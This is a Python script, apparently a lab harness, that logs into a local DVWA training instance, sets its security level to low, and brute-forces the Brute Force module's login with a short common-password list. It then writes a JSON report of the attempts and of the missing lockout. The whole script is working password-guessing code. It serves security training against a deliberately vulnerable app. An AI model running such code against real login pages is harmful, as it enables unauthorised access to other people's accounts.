import argparse
import json
import re
from datetime import datetime, timezone
from html.parser import HTMLParser
from os import stat
from pathlib import Path
from urllib.parse import urljoin

import requests


class InputParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.inputs = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "input":
            self.inputs.append(dict(attrs))


def parse_token(html):
    parser = InputParser()
    parser.feed(html)
    for item in parser.inputs:
        if item.get("name") == "user_token":
            return item.get("value")
    return None


def compact_evidence(html, marker):
    text = re.sub(r"\s+", " ", html)
    idx = text.find(marker)
    if idx == -1:
        return ""
    return text[max(0, idx - 45) : idx + len(marker) + 45]


def post_with_token(session, url, data):
    response = session.get(url, timeout=10)
    token = parse_token(response.text)
    if token:
        data = dict(data)
        data["user_token"] = token
    return session.post(url, data=data, allow_redirects=True, timeout=10)


def main():
    parser = argparse.ArgumentParser(description="Task-specific DVWA Brute Force low harness")
    parser.add_argument("--base-url", default="http://127.0.0.1/DVWA/")
    parser.add_argument("--login-user", default="admin")
    parser.add_argument("--login-pass", default="password")
    parser.add_argument("--proxy", default=None)
    parser.add_argument("--out", default="dvwa-results/brute_low_20260602_report.json")
    parser.add_argument(
        "--source-file",
        default=r"D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\brute\source\low.php",
    )
    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session = requests.Session()
    session.proxies.update(proxies or {})

    base_url = args.base_url if args.base_url.endswith("/") else args.base_url + "/"
    login_url = urljoin(base_url, "login.php")
    security_url = urljoin(base_url, "security.php")
    brute_url = urljoin(base_url, "vulnerabilities/brute/")

    observations = []
    source_file = Path(args.source_file)
    source_meta = None
    if source_file.exists():
        info = stat(source_file)
        source_meta = {
            "path": str(source_file),
            "length": info.st_size,
            "last_modified_local": datetime.fromtimestamp(info.st_mtime).isoformat(),
            "analysis": [
                "Uses GET parameters username, password, and Login.",
                "Hashes supplied password with md5 before querying.",
                "Builds SQL with raw username and md5 password interpolated into the WHERE clause.",
                "No CSRF token, throttling delay, failed-login counter, or lockout exists in the low handler.",
            ],
        }

    login_response = post_with_token(
        session,
        login_url,
        {"username": args.login_user, "password": args.login_pass, "Login": "Login"},
    )
    observations.append(
        {
            "step": "login",
            "status": login_response.status_code,
            "url": login_response.url,
            "authenticated_marker": "Logout" in login_response.text or "Welcome" in login_response.text,
            "cookies": session.cookies.get_dict(),
        }
    )
    if not observations[-1]["authenticated_marker"]:
        raise SystemExit("DVWA login did not show an authenticated marker")

    security_response = post_with_token(
        session,
        security_url,
        {"security": "low", "seclev_submit": "Submit"},
    )
    observations.append(
        {
            "step": "set_security_low",
            "status": security_response.status_code,
            "url": security_response.url,
            "security_cookie": session.cookies.get("security"),
        }
    )

    module_response = session.get(brute_url, timeout=10)
    observations.append(
        {
            "step": "module_page",
            "status": module_response.status_code,
            "url": module_response.url,
            "has_user_token": "user_token" in module_response.text,
            "has_get_form": 'method="GET"' in module_response.text or 'method="get"' in module_response.text,
        }
    )

    failure_marker = "Username and/or password incorrect."
    success_marker = "Welcome to the password protected area"

    candidates = [
        ("admin", "__definitely_wrong_20260602__"),
        ("admin", "123456"),
        ("admin", "admin"),
        ("admin", "letmein"),
        ("admin", "password"),
    ]

    attempts = []
    found = None
    for index, (username, password) in enumerate(candidates, start=1):
        response = session.get(
            brute_url,
            params={"username": username, "password": password, "Login": "Login"},
            timeout=10,
        )
        success = success_marker in response.text
        failure = failure_marker in response.text
        attempt = {
            "index": index,
            "username": username,
            "password": password,
            "status": response.status_code,
            "length": len(response.text),
            "success_marker": success,
            "failure_marker": failure,
            "evidence": compact_evidence(response.text, success_marker if success else failure_marker),
        }
        attempts.append(attempt)
        if success:
            found = {"username": username, "password": password}
            break

    report = {
        "target_url": base_url,
        "module_url": brute_url,
        "module": "Brute Force",
        "difficulty": "low",
        "timestamp_utc": datetime.now(timezone.utc).isoformat(),
        "tool": "Python requests task-specific harness",
        "tool_version": {
            "python_requests": requests.__version__,
        },
        "source_file": source_meta,
        "strategy": {
            "wordlist_source": "Generated from observed DVWA admin account plus generic common passwords; provided login password placed last after invalid baseline.",
            "classification": {
                "success_marker": success_marker,
                "failure_marker": failure_marker,
            },
        },
        "observations": observations,
        "attempts": attempts,
        "request_counts": {
            "module_attempts": len(attempts),
            "successes": sum(1 for item in attempts if item["success_marker"]),
            "failures": sum(1 for item in attempts if item["failure_marker"]),
        },
        "discovered_credentials": found,
        "vulnerability_conclusion": "Low level is brute-forceable: no per-attempt token, lockout, throttling, or delay was observed.",
    }

    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
